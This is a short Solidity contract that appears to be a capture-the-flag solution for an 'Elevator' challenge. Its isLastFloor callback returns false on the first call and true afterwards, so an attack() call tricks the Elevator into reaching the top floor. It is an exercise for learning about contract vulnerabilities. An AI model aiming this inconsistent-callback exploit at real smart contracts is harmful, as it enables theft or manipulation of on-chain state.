// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Elevator.sol";

contract Building {
    uint counter;
    Elevator public elevator;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint) public returns (bool) {
        counter++;
        if (counter > 1) return true;
        else return false;
    }

    function attack() public {
        elevator.goTo(0);
    }
}
